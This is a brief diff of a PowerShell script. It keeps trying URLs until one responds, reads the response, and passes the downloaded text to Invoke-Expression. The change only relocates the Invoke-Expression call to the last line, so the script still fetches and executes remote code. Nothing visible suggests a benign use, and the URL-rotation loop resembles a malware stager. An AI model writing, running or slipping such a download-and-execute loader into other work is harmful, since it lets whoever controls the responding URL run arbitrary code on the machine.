@@ -14,7 +14,7 @@ Function testUrl($url){
 Function getUrl($stream){
   $sr=New-Object System.IO.StreamReader $stream
   $res=$sr.ReadToEnd()
-  Invoke-Expression($res)
+  return $res
 }
 
 function setUrl{
@@ -30,4 +30,4 @@ Do{
   $url=(setUrl)
   write-host $url
 }until(($s=testUrl($url)))
-(getUrl($s))
+Invoke-Expression (getUrl($s))
